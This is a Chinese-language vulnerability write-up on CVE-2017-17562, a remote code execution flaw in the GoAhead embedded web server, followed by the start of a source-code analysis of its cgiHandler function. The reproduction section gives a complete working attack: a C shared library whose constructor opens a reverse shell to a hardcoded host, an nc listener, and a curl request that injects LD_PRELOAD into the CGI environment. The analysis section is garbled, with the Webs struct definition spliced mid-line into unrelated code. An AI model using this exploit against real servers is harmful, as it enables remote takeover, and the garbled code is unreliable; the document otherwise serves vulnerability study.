## 漏洞描述
[GoAhead Web
Server](https://github.com/embedthis/goahead)是为嵌入式实时操作系统定制的开源Web服务器。IBM、HP、Oracle、波音、D-link、摩托罗拉等厂商都曾在其产品中使用过GoAhead。
CVE-2017-17562是一个远程命令执行漏洞，受影响的GoAhead版本为`2.5.0`到`3.6.4`之间。受影响的版本若启用了CGI并动态链接了CGI程序的话，则可导致远程代码执行。漏洞的原因在于cgi.c的cgiHandler函数使用了不可信任的HTTP请求参数初始化CGI脚本的环境，可使用环境变量（LD_PRELOAD），利用glibc动态链接器加载任意程序实现远程代码执行。
## 漏洞复现
下载、编译并运行存在该漏洞的GoAhead（3.6.4）：
    git clone https://github.com/embedthis/goahead.git
    cd goahead
    git checkout tags/v3.6.4 
    make #编译GoAhead
    cd test # 要进到test目录下运行，其它目录下没有self.key等文件会报错
    gcc ./cgitest.c -o cgi-bin/cgitest #编译用来测试的CGI文件
    sudo ../build/linux-x64-default/bin/goahead #运行GoAhead Web服务器
可以访问web服务器，运行起来后可访问80端口。
测试cgi页面能否访问：
    $ curl http://172.16.217.185:80/cgi-bin/cgitest
    cgitest: Output
    Args
    ARG[0]=*****************
    Environment Variables
    AUTH_TYPE=
    CONTENT_LENGTH=-1
    CONTENT_TYPE=
    DOCUMENT_ROOT=
    GATEWAY_INTERFACE=CGI/1.1
    HTTP_ACCEPT=*/*
    HTTP_CONNECTION=
    HTTP_HOST=172.16.217.185
    HTTP_USER_AGENT=curl/7.58.0
    PATH_INFO=
    PATH_TRANSLATED=
    QUERY_STRING=
    REMOTE_ADDR=172.16.217.185
    REQUEST_METHOD=GET
    REQUEST_URI=/cgi-bin/cgitest
    REMOTE_USER=
    SCRIPT_NAME=/cgi-bin/cgitest
    SCRIPT_FILENAME=****************
    SERVER_ADDR=172.16.217.185
    SERVER_NAME=127.0.1.1
    SERVER_PORT=80
    SERVER_PROTOCOL=HTTP/1.1
    SERVER_SOFTWARE=GoAhead/3.6.4
接着编译用于动态加载的so。
    #include
    #include
    #include
    #include
    char *server_ip="172.16.217.185";
    uint32_t server_port=7777;
    static void reverse_shell(void) __attribute__((constructor));
    static void reverse_shell(void) 
    {
      //socket initialize
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in attacker_addr = {0};
        attacker_addr.sin_family = AF_INET;
        attacker_addr.sin_port = htons(server_port);
        attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
      //connect to the server
        if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
            exit(0);
      //dup the socket to stdin, stdout and stderr
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
      //execute /bin/sh to get a shell
        execve("/bin/sh", 0, 0);
    }
编译命令：
    gcc -shared -fPIC ./exp.c -o exp.so
然后在控制端监听7777端口：
    nc -lvnp 7777
执行poc：
    curl -X POST --data-binary @exp.so http://172.16.217.185:80/cgi-bin/cgitest\?LD_PRELOAD\=/proc/self/fd/0
可以看到成功拿到shell。
漏洞复现成功。
## 漏洞分析
根据漏洞描述，知道漏洞点存在于`cgiHandler`中，先去看`cgiHandler`函数。
    漏洞的原因在于cgi.c的cgiHandler函数使用了不可信任的HTTP请求参数初始化CGI脚本的环境
因为程序是支持`windows`、`linux`以及`vxWorks`的，所以很多函数或代码或有三份实现，我分析的都是基于`linux`的，即宏定义为`#if
ME_UNIX_LIKE || QNX`的相关代码。
动态调试发送`post`过去的数据为：
    curl -X POST --data-binary @exp.so http://172.16.217.185:80/cgi-bin/cgitest\?LD_PRELOAD\=/proc/self/fd/0
开始分析之前贴出`Webs`结构体的定义，该结构体中包含了web请求的相关数据结构，定义在`goahead.h`中，且每个字段都有相应的解释：
    /**
        GoAhead request structure. This is a per-socket connection structure.
        @defgroup Webs Webs
     */
    typedef struct Wqbs {
        WebsBuf         rxbuf;              /**vars); s != NULL; s = hashNext(wp->vars, s)) {
            if (s->content.valid && s->content.type == string &&
                strcmp(s->name.value.string, "REMOTE_HOST") != 0 &&
                strcmp(s->name.value.string, "HTTP_AUTHORIZATION") != 0) {
                envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
                trace(5, "Env[%d] %s", n, envp[n-1]);
                if (n >= envpsize) {
                    envpsize *= 2;
                    envp = wrealloc(envp, envpsize * sizeof(char *));
                }